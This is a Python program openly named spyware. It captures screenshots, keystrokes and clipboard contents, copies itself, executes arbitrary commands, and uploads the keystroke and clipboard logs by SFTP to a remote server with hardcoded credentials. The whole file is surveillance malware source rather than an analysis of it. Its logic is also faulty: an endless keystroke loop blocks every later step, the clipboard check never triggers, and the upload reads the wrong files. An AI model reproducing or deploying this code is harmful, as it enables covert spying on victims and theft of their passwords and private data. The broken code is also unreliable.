import os
import sys
import pyautogui
import keyboard
import pyperclip
import time
import shutil
import argparse
import logging
import subprocess
import paramiko

def take_screenshot():
    """
    Take a screenshot of the current screen and save it as "screenshot.png".
    """
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def record_keystrokes():
    """
    Record keystrokes continuously and save them to a file called "keystrokes.txt".
    """
    with open("keystrokes.txt", "a") as f:
        while True:
            event = keyboard.read_event()
            if event.event_type == "down":
                f.write(event.name)

def record_clipboard():
    """
    Monitor the clipboard for changes and save the copied content to a file called "clipboard.txt".
    """
    with open("clipboard.txt", "a") as f:
        while True:
            if pyperclip.paste() != pyperclip.paste():
                f.write(pyperclip.paste() + "\n")

def self_replicate():
    """
    Create the "spyware_data" directory if it doesn't exist and copy the current program to it.
    """
    current_dir = os.getcwd()
    if not os.path.exists("spyware_data"):
        os.mkdir("spyware_data")
    os.chdir("spyware_data")

    if not os.path.exists("spyware.py"):
        shutil.copy(__file__, "spyware.py")

    os.chdir(current_dir)

def execute_command(command):
    """
    Execute a given command using the `os.system` function.
    """
    os.system(command)

def encrypt_file(file_path):
    """
    Encrypt a file using the `gpg` command-line tool.
    """
    subprocess.call(['gpg', '--symmetric', '--cipher-algo', 'AES256', file_path])

def upload_files():
    """
    Upload the captured data files to a remote server using SFTP.
    """
    server = "example.com"
    username = "admin"
    password = "password"
    remote_directory = "/spyware_data"

    # Create an SFTP client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(server, username=username, password=password)

    sftp = ssh.open_sftp()

    # Upload the files
    for file_name in ["keystrokes.txt", "clipboard.txt"]:
        local_file_path = os.path.join("spyware_data", file_name)
        remote_file_path = os.path.join(remote_directory, file_name)
        sftp.put(local_file_path, remote_file_path)

    # Close the SFTP connection
    sftp.close()
    ssh.close()

def main():
    """
    The main function of the Spyware program. It creates a command-line interface (CLI)
    using the `argparse` module to execute commands remotely. If no command is provided,
    it runs the Spyware program indefinitely, taking screenshots, recording keystrokes,
    and monitoring the clipboard.
    """
    parser = argparse.ArgumentParser(description="Spyware Command-Line Interface")
    parser.add_argument("--command", "-c", help="Execute a command remotely")
    args = parser.parse_args()

    if args.command:
        execute_command(args.command)
        sys.exit()

    try:
        while True:
            self_replicate()
            take_screenshot()
            record_keystrokes()
            record_clipboard()

            # Encrypt sensitive files
            encrypt_file("keystrokes.txt")
            encrypt_file("clipboard.txt")

            # Upload the files
            upload_files()

            time.sleep(5)
    except KeyboardInterrupt:
        print("\nSpyware stopped.")
        sys.exit()

if __name__ == "__main__":
    main()